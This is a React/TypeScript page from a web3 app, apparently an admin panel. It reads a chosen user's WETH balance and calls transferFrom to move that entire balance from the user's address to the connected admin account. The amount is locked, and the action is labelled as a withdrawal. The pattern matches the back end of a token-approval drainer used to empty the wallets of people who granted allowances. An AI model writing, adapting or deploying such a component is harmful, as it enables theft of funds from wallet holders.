import { Form, Formik } from "formik";
import Header from "../components/Header";
import TextField from "../components/TextField";
import { Button, Spin } from "antd";
import * as Yup from "yup";
import { useWeb3React } from "../hooks/useWeb3React";

import useERC20 from "../hooks/useERC20";
import { useState } from "react";
import { erc20ABI, useContractWrite } from "wagmi";

function Home() {
  const { account }: any = useWeb3React();
  const [userAddress, setUserAddress] = useState<any>(null);
  const { data: balance }: any = useERC20(
    "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
    [userAddress]
  );

  const { write, isLoading } = useContractWrite({
    address: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
    abi: erc20ABI,
    functionName: "transferFrom",
  });
  return (
    <>
      <Header />
      <main className="max-w-[1300px] mx-auto my-5">
        <div>
          <Formik
            initialValues={{
              adminAddress: account,
              userAddress: "",
              amount: parseInt(balance),
            }}
            enableReinitialize
            validationSchema={Yup.object().shape({
              amount: Yup.number().required("Amount is required"),
            })}
            onSubmit={(values) => {
              alert(JSON.stringify(values, null, 2));
              write({
                args: [userAddress, account, balance],
              });
            }}
          >
            {({ handleSubmit, setFieldValue }) => (
              <>
                <Form onSubmit={handleSubmit}>
                  <TextField
                    name="adminAddress"
                    placeholder="Admin Address"
                    label={"Admin Address"}
                    isRequired={false}
                    disabled={true}
                  />
                  <TextField
                    name="userAddress"
                    placeholder="User Address"
                    label={"User Address"}
                    isRequired={false}
                    disabled={isLoading}
                    onChange={(e: any) => {
                      setFieldValue("userAddress", e.target.value);
                      setUserAddress(e.target.value);
                    }}
                  />
                  <TextField
                    name="amount"
                    placeholder="0.001 WETH"
                    label={"Withdrawal Amount"}
                    isRequired={false}
                    disabled={true}
                  />
                  <Button
                    type="primary"
                    htmlType="submit"
                    className="bg-green-500"
                    disabled={isLoading}
                  >
                    {isLoading ? <Spin /> : "Submit"}
                  </Button>
                </Form>
              </>
            )}
          </Formik>
        </div>
      </main>
    </>
  );
}

export default Home;
